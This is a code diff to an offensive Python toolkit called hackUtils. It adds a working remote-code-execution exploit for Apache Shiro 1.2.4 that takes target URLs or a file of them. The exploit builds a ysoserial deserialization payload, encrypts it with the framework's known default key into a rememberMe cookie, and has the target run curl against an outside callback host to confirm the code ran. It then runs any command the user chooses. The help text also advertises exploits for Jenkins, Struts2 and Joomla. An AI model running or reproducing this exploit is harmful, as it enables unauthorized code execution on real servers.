@@ -19,10 +19,15 @@ import ConfigParser
 import cookielib
 import requests
 import socket
+import commands
+import random
+
 timeout = 10
 socket.setdefaulttimeout(timeout)
 
 from bs4 import BeautifulSoup
+from Crypto.Cipher import AES
+from Crypto import Random
 
 # Ignore SSL error when accessing a HTTPS website
 # ssl._create_default_https_context = ssl._create_unverified_context
@@ -795,10 +800,93 @@ def exploitS2032(exp):
     response = requests.get(exp, timeout=10) 
     return response.content
     
+def rceApacheShiro(value):
+    value_url = value.strip().split("::")[0]
+    if len(value.strip().split("::"))>1:
+        value_cmdstr = value.strip().split("::")[1]
+    else:
+        value_cmdstr = ''
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking Apache Shiro 1.2.4 Remote Code Execution..."
+    if os.path.exists(value_url.strip()):
+        urlfile=open(value_url,'r')
+        for url in urlfile:
+            if url.strip():
+                checkApacheShiro(url, value_cmdstr)
+        urlfile.close()
+    else:
+        checkApacheShiro(value_url, value_cmdstr)
+    output = os.path.dirname(os.path.realpath(__file__))+"/shiro.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
+
+def checkApacheShiro(url, cmdstr):
+    url = url.strip()
+    try:
+        key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==') # Default AES Key for shiro 1.2.4
+        id = hashlib.md5(str(time.strftime('%H:%M:%S',time.localtime(time.time())))+str(random.random())).hexdigest()
+        verify_url = 'http://cloudeye.avfisher.win/index.php?id='+id
+        cmdcheck='curl '+verify_url+'&flag=rceApacheShiro'
+        check=exploitApacheShiro(url, cmdcheck)
+        time.sleep(5)
+        verify = requests.get(verify_url, timeout=10, verify=False).content
+        if check == "succeed" and id in verify:
+            if cmdstr != "":
+                exploitApacheShiro(url, cmdstr)
+            vul= "[+] vuls found! url: "+url
+            logfile(vul,'shiro.txt')
+            print vul
+        else:
+            print '[!] no vuls! url: '+url
+    except Exception, e:
+        print str(e)
+        print '[!] connection failed! url: '+url
+
+def exploitApacheShiro(url,cmdstr):
+    key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==') # Default AES Key for shiro 1.2.4
+    payload = generateApacheShiroPayload(cmdstr)
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
+                             'Chrome/45.0.2454.101 Safari/537.36',
+               'Cookie': 'rememberMe=%s' % shiroAesEncryption(key, open(payload, 'rb').read()),
+               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
+    conn = requests.get(url, timeout=10, verify=False, headers=headers)
+    status_conn = conn.status_code
+    if os.path.exists(os.path.dirname(os.path.realpath(__file__))+"/"+payload):
+        os.remove(os.path.dirname(os.path.realpath(__file__))+"/"+payload)
+    if status_conn == 200:
+        return "succeed"
+    else:
+        return "failed"
+
+def shiroAesEncryption(key, text):
+    BS = AES.block_size
+    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+    unpad = lambda s: s[0:-ord(s[-1])]
+    IV = Random.new().read(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CBC, IV=IV)
+    data = base64.b64encode(IV + cipher.encrypt(pad(text)))
+    return data
+
+def generateApacheShiroPayload(cmdstr):
+    payload = "payload.t"
+    cmd = "java -jar ysoserial-0.0.4-all.jar CommonsCollections2 '"+cmdstr+"' > "+payload
+    (status, output) = commands.getstatusoutput(cmd)
+    if status == 0:
+        return payload
+    else:
+        print "[!] generate payload failed!"
+        exit()
+
 def myhelp():
-    print "\n+-----------------------------+"
-    print "|  hackUtils v0.1.2           |"
-    print "+-----------------------------+\n"
+    print '''
+     _                _    _   _ _   _ _             _____  _____  
+    | |              | |  | | | | | (_) |           |  _  |/ __  \ 
+    | |__   __ _  ___| | _| | | | |_ _| |___  __   _| |/' |`' / /' 
+    | '_ \ / _` |/ __| |/ / | | | __| | / __| \ \ / /  /| |  / /   
+    | | | | (_| | (__|   <| |_| | |_| | \__ \  \ V /\ |_/ /./ /___ 
+    |_| |_|\__,_|\___|_|\_\\\\___/ \__|_|_|___/   \_/  \___(_)_____/                                                                                                                                                                                                                                                                 
+    '''
     print "Usage: hackUtils.py [options]\n"
     print "Options:"
     print "  -h, --help                                          Show basic help message and exit"
@@ -811,6 +899,7 @@ def myhelp():
     print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
     print "  -f url|file, --ffcms=url|file                       Exploit Remote Code Execution for FeiFeiCMS 2.8 (Password: 1)"
     print "  -k ip|file[::cmd], --jenkins=ip|file[::cmd]         Exploit Remote Code Execution for XStream (Jenkins CVE-2016-0792)"
+    print "  -o url|file[::cmd], --shiro=url|file[::cmd]         Exploit Remote Code Execution for Apache Shiro 1.2.4"
     print "  -s url|file, --s2032=url|file                       Exploit Remote Code Execution for Struts2 (S2-032)"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
@@ -830,6 +919,8 @@ def myhelp():
     print "  hackUtils.py -k 10.10.10.10::dir"
     print "  hackUtils.py -k ips.txt"
     print "  hackUtils.py -k ips.txt::\"touch /tmp/jenkins\""
+    print "  hackUtils.py -o http://www.shiro.com/::\"touch /tmp/shiro\""
+    print "  hackUtils.py -o urls.txt::\"touch /tmp/shiro\""
     print "  hackUtils.py -s http://www.struts2.com/index.action"
     print "  hackUtils.py -s urls.txt"
     print "  hackUtils.py -d example.com"
@@ -838,7 +929,7 @@ def myhelp():
 
 def main():
     try:
-        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:k:s:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","jenkins=","s2032=","domain=","encrypt="])
+        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:k:o:s:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","jenkins=","shiro=","s2032=","domain=","encrypt="])
     except getopt.GetoptError:
         print "\n[WARNING] error, to see help message of options run with '-h'"
         sys.exit()
@@ -864,6 +955,8 @@ def main():
             rceFeiFeiCMS(value)
         if name in ("-k","--jenkins"):
             rceXStreamJenkins(value)
+        if name in ("-o","--shiro"):
+            rceApacheShiro(value)
         if name in ("-s","--s2032"):
             rceStruts2S2032(value)
         if name in ("-d","--domain"):
